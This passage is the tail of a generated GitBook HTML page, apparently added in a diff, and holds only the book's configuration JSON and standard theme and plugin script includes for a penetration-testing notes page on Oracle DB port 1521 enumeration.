SQL","level":"2.1.3.23","depth":3,"path":"infrastructure-testing/enumeration/services-ports/1433-microsoft-sql.md","ref":"infrastructure-testing/enumeration/services-ports/1433-microsoft-sql.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":["livereload"],"pluginsConfig":{"livereload":{},"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"infrastructure-testing/enumeration/services-ports/1521-oracle-db.md","mtime":"2020-10-31T15:57:45.682Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2020-11-01T17:33:13.702Z"},"basePath":"../../..","book":{"language":""}});
+        });
+    </script>
+</div>
+
+        
+    <script src="../../../gitbook/gitbook.js"></script>
+    <script src="../../../gitbook/theme.js"></script>
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-livereload/plugin.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-search/search-engine.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-search/search.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-lunr/lunr.min.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-lunr/search-lunr.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-sharing/buttons.js"></script>
+        
+    
+        
+        <script src="../../../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
+        
+    
+
+    </body>
+</html>
+
